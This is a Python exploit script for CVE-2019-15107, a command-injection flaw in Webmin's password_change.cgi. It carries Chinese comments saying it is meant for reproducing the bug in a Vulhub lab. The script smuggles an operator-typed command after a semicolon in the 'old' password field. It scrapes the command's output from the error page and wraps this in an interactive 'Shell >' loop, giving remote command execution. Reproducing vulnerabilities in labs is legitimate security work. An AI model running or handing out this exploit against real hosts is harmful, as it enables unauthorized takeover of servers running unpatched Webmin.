# By Epicccal
# 本脚本仅可应用于 CVE-2019-15107 漏洞复现
# VulHub : https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107

import requests
import re
import warnings
warnings.filterwarnings("ignore")

# 以下两个参数需要修改IP地址
url = "https://127.0.0.1:10001/password_change.cgi"
headers = {"Referer": "https://127.0.0.1:10001/session_login.cgi"}

def httppost(code):
    payload="user=&pam=1&expired=2&old=asd;" + code + "&new1=abc&new2=abc"
    response = requests.post(url,data=payload,headers=headers,verify=False)
    html = response.text
    #正则表达式获取<center><h3></h3></center>标签之间内容
    pattern = r'<center><h3>Failed to change password : The current password is incorrect(.*?)</h3></center>'
    result =  re.findall(pattern,html,re.S|re.M)
    for line in result:
        print(line)


if __name__ == '__main__':
    code = input("Shell > ")
    while code != '':
        httppost(code)
        code = input("Shell > ")
